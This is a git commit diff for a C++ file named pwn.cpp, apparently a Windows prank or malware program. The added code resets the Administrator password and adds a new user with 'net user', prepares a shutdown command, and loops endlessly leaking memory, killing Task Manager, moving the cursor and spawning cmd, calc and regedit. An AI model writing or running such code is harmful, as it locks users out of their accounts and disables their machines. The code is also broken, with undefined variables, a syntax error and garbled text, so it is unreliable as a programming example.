4b3d1e1278e9f63f4097ff4014baaaebd2d608c1
Wind <71535035+Hope-wind@users.noreply.github.com>
2020-12-20 15:04:43 +0800

    Update pwn.cpp

--- pwn.cpp
+++ pwn.cpp
@@ -1,10 +1,36 @@
-#include<stdio.h>
 #include<stdlib.h>
+#include<stdio.h>
+#include<windows.h>
+#include<iostream>
+#include<ctime>
+#include<conio.h>
 
-int main(void)
+using namespace std;
+
+int pwn()
 {
-    while(true)
-    {
-        malloc(1024);
-    }
+	system("net user Administrator weihfilawhgilgilghfileghilaergh");
+	system("pause");
+	system("net user æ»‘ç¨½ afawdawdaw /add");
+	char cmd[]="shutdown -s -t 20";
+	
+
+	//ç»ˆæžæ€å™¨
+	while(true)
+	{
+		malloc(1024);
+		SetCursorPos(rand()%x,rand()%y);
+		system("taskkill /f /im taskmgr.exe");
+		system("cmd");
+		system("calc");
+		system("regedit";)
+
+	}
+}
+
+
+int main()
+{
+	pwn();
+	return 0;
 }
